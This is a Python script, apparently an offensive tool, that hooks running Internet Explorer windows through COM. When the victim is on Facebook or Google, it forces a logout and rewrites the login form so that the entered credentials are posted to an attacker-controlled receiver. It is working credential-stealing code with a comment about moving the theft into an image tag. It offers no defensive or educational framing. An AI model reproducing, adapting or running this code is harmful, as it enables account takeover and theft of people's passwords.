import win32com.client
import time
import urlparse
import urllib

# This web server will receive the credentials from our target sites
# TODO: change exfiltration via image tag
data_receiver = "http://127.0.0.1:8080/"

# We set up a dictionary of target sites
target_sites = {}

target_sites["www.facebook.com"] = {
        # This is a URL we can redirect via a GET request 
        # to force the user to log out
        "logout_url" : None,
        # DOM element that we can submit that forces the logout
        "logout_form" : "logout_form",
        # Relative location in the target's domain DOM
        # that contains the login form we will modify
        "login_form_index" : 0,
        # Flags that tells if we have captured credentials from
        # a target site and avoid multiple forced logins
        "owned" : False 
    }

target_sites["accounts.google.com"] = {
        "logout_url" : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
        "login_url" : "https://accounts.google.com/signin/v1/lookup",
        "logout_form" : None,
        "login_form_index" : 0,
        "owned" : False
    }
    

# Use the same target for multiple Gmail domains
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]
target_sites["maps.google.com"] = target_sites["accounts.google.com"]

# Internet Explorer's class ID
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
# We instantiate the COM object
windows = win32com.client.Dispatch(clsid)

def wait_for_browser(browser):
    # Wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

# We start our primary loop where we monitor our victim's browser session 
# for the sites for which we want to capture the credentials
while True:
    # Iterate through all currently running IE objects
    for browser in windows:
        print browser.LocationUrl
        url = urlparse.urlparse(browser.LocationUrl)
        # If the victim is visiting one of our defined sites start the attack
        if url.hostname in target_sites:
            print "[**] hostname: %s is in scope!" % url.hostname
            # Have we already executed an attack on that site?
            if target_sites[url.hostname]["owned"]:
                print "[!] We have already captured credentials for this site!"
                continue
        # Check if the target website has a simple logout URL that we can sue
        if target_sites[url.hostname]["logout_url"]:
            browser.Navigate(target_sites[url.hostname]["logout_url"])
            # Wait that the browser completes the operation
            wait_for_browser(browser)
        else:
            print "[***] The website requires to submit a form to logout"
            # If the website requires the user to submit a form to force the logout           
            full_doc = browser.Document.all
            
            # Iterate, looking for the element ID of the logout form
            for i in full_doc:
                try:
                    # Find the logout form and submit it
                    if i.id == target_sites[url.hostname]["logout_form"]:
                        print "[****] found the logout form, submitting..."
                        i.submit()
                        wait_for_browser(browser)
                except:
                    pass
        # After the user has been redirected to the login form
        try:
            # Get the first level domain
            domain = url.hostname.split(".")
            first_level_domain = "%s.%s" % (domain[1],domain[2])
            
            # If we are trying to grab Google's credentials we need to bypass the 2 step login
            # This is a quick and ugly workaround to test the script
            if first_level_domain == 'google.com':
                while True:
                    url2 = urlparse.urlparse(browser.LocationUrl)
                    url_browser = url2.hostname + url2.path
                    print url_browser
                    print "[---->] Current URL: %s" % url2.hostname
                    if url_browser in target_sites[url.hostname]["login_url"]:
                        break
            login_index = target_sites[url.hostname]["login_form_index"]
            login_page = urllib.quote(browser.LocationUrl)
            # We modify the form stored on the endpoint to send the credentials to our server
            browser.Document.forms[login_index].action = "%s%s" % (data_receiver,login_page)
            target_sites[url.hostname]["owned"] = True                
        except:
            pass

    time.sleep(5)
        
        
    
            


